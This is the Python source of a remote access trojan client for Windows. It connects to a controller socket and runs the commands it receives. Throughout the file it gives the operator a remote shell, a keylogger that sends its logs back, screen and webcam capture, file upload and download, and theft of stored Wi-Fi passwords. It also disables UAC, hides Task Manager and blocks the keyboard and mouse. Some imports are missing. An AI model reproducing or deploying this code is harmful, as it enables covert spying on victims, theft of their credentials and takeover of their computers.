import socket
import os
import platform
import json
import urllib.request
import subprocess
import ctypes
from pynput.keyboard import Listener
from pynput.mouse import Controller
from threading import Thread
import time
import pyautogui
import cv2
import shutil
from PIL import Image
from datetime import datetime
import glob
import requests



user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2


class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.host, self.port))
        self.kbrd = False
        self.mousedbl = False
        self.block = False
        self.klgr = False

    def keylogger(self):
        def on_press(key):
            if self.klgr:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()

    def block_task_manager(self):
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            while True:
                if self.block:
                    hwnd = user32.FindWindowW(0, "Task Manager")
                    user32.ShowWindow(hwnd, 0)
                    ctypes.windll.kernel32.Sleep(500)

    def disable_all(self):
        while True:
            user32.BlockInput(True)

    def disable_mouse(self):
        mouse = Controller()
        t_end = time.time() + 3600*24*11
        while time.time() < t_end and self.mousedbl:
            mouse.position = (0, 0)

    def disable_keyboard(self):
        for i in range(150):
            if self.kbrd:
                keyboard.block_key(i)
        time.sleep(999999)

    def errorsend(self):
        self.s.send("Error executing command".encode())

    def execute(self):
        while True:
            command = self.s.recv(1024).decode()

            if command == 'shell':
                while True:
                    command = self.s.recv(1024).decode()
                    if command.lower() == 'exit':
                        break
                    if command[:2] == 'cd':
                        os.chdir(command[3:])
                        self.s.send(str(os.getcwd()).encode())
                    else:
                        output = subprocess.getoutput(command)
                        self.s.send(output.encode())
                        if not output:
                            self.errorsend()

            elif command == 'screenshare':
                try:
                    from vidstream import ScreenShareClient
                    screen = ScreenShareClient(self.host, 8080)
                    screen.start_stream()
                except:
                    self.s.send("Impossible to get screen".encode())

            elif command == 'webcam':
                try:
                    from vidstream import CameraClient
                    cam = CameraClient(self.host, 8080)
                    cam.start_stream()
                except:
                    self.s.send("Impossible to get webcam".encode())

            elif command == 'breakstream':
                pass

            elif command == 'list':
                pass

            elif command == 'geolocate':
                response = requests.get("https://geolocation-db.com/json")
                data = response.json()
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                self.s.send(link.encode())

            elif command == 'setvalue':
                const = self.s.recv(1024).decode()
                root = self.s.recv(1024).decode()
                key2 = self.s.recv(1024).decode()
                value = self.s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    elif const == 'HKEY_CLASSES_ROOT':
                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    elif const == 'HKEY_LOCAL_MACHINE':
                        key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    elif const == 'HKEY_USERS':
                        key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    elif const == 'HKEY_CURRENT_CONFIG':
                        key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                        SetValueEx(key, key2, 0, REG_SZ, str(value))
                        CloseKey(key)
                    self.s.send("Value is set".encode())
                except:
                    self.s.send("Impossible to create key".encode())

            elif command == 'delkey':
                const = self.s.recv(1024).decode()
                root = self.s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
                    elif const == 'HKEY_LOCAL_MACHINE':
                        DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
                    elif const == 'HKEY_USERS':
                        DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
                    elif const == 'HKEY_CLASSES_ROOT':
                        DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
                    elif const == 'HKEY_CURRENT_CONFIG':
                        DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
                    self.s.send("Key is deleted".encode())
                except:
                    self.s.send("Impossible to delete key".encode())

            elif command == 'createkey':
                const = self.s.recv(1024).decode()
                root = self.s.recv(1024).decode()
                try:
                    if const == 'HKEY_CURRENT_USER':
                        CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_LOCAL_MACHINE':
                        CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_USERS':
                        CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_CLASSES_ROOT':
                        CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                    elif const == 'HKEY_CURRENT_CONFIG':
                        CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                    self.s.send("Key is created".encode())
                except:
                    self.s.send("Impossible to create key".encode())

            elif command == 'volumeup':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    if volume.GetMute() == 1:
                        volume.SetMute(0, None)
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
                    self.s.send("Volume is increased to 100%".encode())
                except:
                    self.s.send("Module is not found".encode())

            elif command == 'volumedown':
                try:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume = cast(interface, POINTER(IAudioEndpointVolume))
                    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
                    self.s.send("Volume is decreased to 0%".encode())
                except:
                    self.s.send("Module is not found".encode())

            elif command == 'setwallpaper':
                pic = self.s.recv(6000).decode()
                try:
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, pic, 0)
                    self.s.send(f'{pic} is set as a wallpaper'.encode())
                except:
                    self.s.send("No such file".encode())

            elif command == 'usbdrivers':
                p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
                self.s.send(p.encode())

            elif command == 'monitors':
                p = subprocess.check_output([r"powershell.exe", r"Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
                self.s.send(p.encode())

            elif command == 'sysinfo':
                sysinfo = str(f'''
System: {platform.platform()} {platform.win32_edition()}
Architecture: {platform.architecture()}
Name of Computer: {platform.node()}
Processor: {platform.processor()}
Python: {platform.python_version()}
Java: {platform.java_ver()}
User: {os.getlogin()}
                ''')
                self.s.send(sysinfo.encode())

            elif command == 'reboot':
                os.system("shutdown /r /t 1")
                self.s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())

            elif command[:7] == 'writein':
                pyautogui.write(command.split(" ")[1])
                self.s.send(f'{command.split(" ")[1]} is written'.encode())

            elif command[:8] == 'readfile':
                try:
                    f = open(command[9:], 'r')
                    data = f.read()
                    if not data: 
                        self.s.send("No data".encode())
                    else:
                        self.s.send(data.encode())
                    f.close()
                except:
                    self.s.send("No such file in directory".encode())

            elif command[:7] == 'abspath':
                try:
                    path = os.path.abspath(command[8:])
                    self.s.send(path.encode())
                except:
                    self.s.send("No such file in directory".encode())

            elif command == 'pwd':
                self.s.send(str(os.getcwd()).encode())

            elif command == 'ipconfig':
                output = subprocess.check_output('ipconfig', encoding='oem')
                self.s.send(output.encode())

            elif command == 'portscan':
                output = subprocess.check_output('netstat -an', encoding='oem')
                self.s.send(output.encode())

            elif command == 'tasklist':
                output = subprocess.check_output('tasklist', encoding='oem')
                self.s.send(output.encode())

            elif command == 'profiles':
                output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                self.s.send(output.encode())

            elif command == 'profilepswd':
                profile = self.s.recv(6000).decode()
                try:
                    output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
                    self.s.send(output.encode())
                except:
                    self.errorsend()

            elif command == 'systeminfo':
                output = subprocess.check_output('systeminfo', encoding='oem')
                self.s.send(output.encode())

            elif command == 'sendmessage':
                text = self.s.recv(6000).decode()
                title = self.s.recv(6000).decode()
                self.s.send('MessageBox has appeared'.encode())
                user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)

            elif command.startswith("disable") and command.endswith("--all"):
                Thread(target=self.disable_all, daemon=True).start()
                self.s.send("Keyboard and mouse are disabled".encode())

            elif command.startswith("disable") and command.endswith("--keyboard"):
                self.kbrd = True
                Thread(target=self.disable_keyboard, daemon=True).start()
                self.s.send("Keyboard is disabled".encode())

            elif command.startswith("disable") and command.endswith("--mouse"):
                self.mousedbl = True
                Thread(target=self.disable_mouse, daemon=True).start()
                self.s.send("Mouse is disabled".encode())

            elif command == 'disableUAC':
                os.system("reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f")

            elif command.startswith("enable") and command.endswith("--keyboard"):
                self.kbrd = False
                self.s.send("Keyboard is enabled".encode())

            elif command.startswith("enable") and command.endswith("--mouse"):
                self.mousedbl = False
                self.s.send("Mouse is enabled".encode())

            elif command.startswith("enable") and command.endswith("--all"):
                user32.BlockInput(False)
                self.s.send("Keyboard and mouse are enabled".encode())

            elif command == 'turnoffmon':
                self.s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)

            elif command == 'turnonmon':
                self.s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)

            elif command == 'extendrights':
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
                self.s.send(sending.encode())

            elif command == 'isuseradmin':
                if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                    self.s.send(f'{socket.gethostbyname(socket.gethostname())} is admin'.encode())
                else:
                    self.s.send(f'{socket.gethostbyname(socket.gethostname())} is not admin'.encode())

            elif command == 'keyscan_start':
                self.klgr = True
                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                Thread(target=self.keylogger, daemon=True).start()
                self.s.send("Keylogger is started".encode())

            elif command == 'send_logs':
                try:
                    with open("keylogs.txt", 'r') as f:
                        lines = f.readlines()
                    self.s.send(str(lines).encode())
                    os.remove('keylogs.txt')
                except:
                    self.errorsend()

            elif command == 'stop_keylogger':
                self.klgr = False
                self.s.send("The session of keylogger is terminated".encode())

            elif command == 'cpu_cores':
                output = os.cpu_count()
                self.s.send(str(output).encode())

            elif command[:7] == 'delfile':
                try:
                    os.remove(command[8:])
                    self.s.send(f'{command[8:]} was successfully deleted'.encode())
                except:
                    self.errorsend()

            elif command[:8] == 'editfile':
                try:
                    with open(command.split(" ")[1], 'a') as f:
                        f.write(command.split(" ")[2])
                        f.close()
                    self.s.send(f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'.encode())
                except:
                    self.errorsend()

            elif command[:2] == 'cp':
                try: 
                    shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                    self.s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()

            elif command[:2] == 'mv':
                try:
                    shutil.move(command.split(" ")[1], command.split(" ")[2])
                    self.s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()

            elif command[:2] == 'cd':
                try:
                    os.chdir(command[3:])
                    self.s.send(str(os.getcwd()).encode())
                except:
                    self.s.send("No such directory".encode())

            elif command == 'cd ..':
                os.chdir('..')
                self.s.send(str(os.getcwd()).encode())

            elif command == 'dir':
                try:
                    output = subprocess.check_output(["dir"], shell=True)
                    output = output.decode('utf8', errors='ignore')
                    self.s.send(output.encode())
                except:
                    self.errorsend()

            elif command[1:2] == ':':
                try:
                    os.chdir(command)
                    self.s.send(str(os.getcwd()).encode())
                except: 
                    self.s.send("No such directory".encode())

            elif command[:10] == 'createfile':
                kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                self.s.send(f'{command[11:]} was created'.encode())

            elif command[:10] == 'searchfile':
                for x in glob.glob(command.split(" ")[2]+"\\**\\*", recursive=True):
                    if x.endswith(command.split(" ")[1]):
                        path = os.path.abspath(x)
                        self.s.send(str(path).encode())

            elif command == 'curpid':
                pid = os.getpid()
                self.s.send(str(pid).encode())

            elif command == 'drivers':
                drives = []
                bitmask = kernel32.GetLogicalDrives()
                letter = ord('A')
                while bitmask > 0:
                    if bitmask & 1:
                        drives.append(chr(letter) + ':\\')
                    bitmask >>= 1
                    letter += 1
                self.s.send(str(drives).encode())

            elif command[:4] == 'kill':
                try:
                    os.system(f'TASKKILL /F /im {command[5:]}')
                    self.s.send(f'{command[5:]} was terminated'.encode())
                except:
                    self.errorsend()

            elif command == 'shutdown':
                os.system('shutdown /s /t 1')
                self.s.send(f"{socket.gethostbyname(socket.gethostname())} was shut down".encode())

            elif command == 'disabletaskmgr':
                self.block = True
                Thread(target=self.block_task_manager, daemon=True).start()
                self.s.send("Task Manager is disabled".encode())

            elif command == 'enabletaskmgr':
                self.block = False
                self.s.send("Task Manager is enabled".encode())

            elif command == 'localtime':
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                self.s.send(str(current_time).encode())

            elif command[:9] == 'startfile':
                try:
                    self.s.send(f'{command[10:]} was started'.encode())
                    os.startfile(command[10:])
                except:
                    self.errorsend()

            elif command[:8] == 'download':
                try:
                    with open(command.split(" ")[1], 'rb') as file:
                        data = file.read()
                    self.s.send(data)
                except:
                    self.errorsend()

            elif command == 'upload':
                filename = self.s.recv(6000).decode()
                with open(filename, 'wb') as newfile:
                    data = self.s.recv(6000)
                    newfile.write(data)
            
            elif command[:5] == 'mkdir':
                try:
                    os.mkdir(command[6:])
                    self.s.send(f'Directory {command[6:]} was created'.encode())
                except:
                    self.errorsend()

            elif command[:5] == 'rmdir':
                try:
                    shutil.rmtree(command[6:])
                    self.s.send(f'Directory {command[6:]} was removed'.encode())
                except:
                    self.errorsend()

            elif command == 'browser':
                query = self.s.recv(6000).decode()
                try:
                    if re.search(r'\.', query):
                        webbrowser.open_new_tab('https://' + query)
                    elif re.search(r' ', query):
                        webbrowser.open_new_tab('https://yandex.ru/search/?text='+query)
                    else:
                        webbrowser.open_new_tab('https://yandex.ru/search/?text=' + query)
                    self.s.send("The tab is opened".encode())
                except:
                    self.errorsend()

            elif command == 'screenshot':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    pyautogui.screenshot(file)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    with open(file2, 'rb') as file:
                        data = file.read()
                    self.s.send(data)
                except:
                    self.errorsend()

            elif command == 'webcam_snap':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    cam = cv2.VideoCapture(0)
                    ret, image = cam.read()
                    cv2.imwrite(file, image)
                    cam.release()
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    with open(file2, 'rb') as file:
                        data = file.read()
                    self.s.send(data)
                except:
                    self.errorsend()

if __name__ == "__main__":
    client = RAT_CLIENT('127.0.0.1', 5000)
    client.execute()
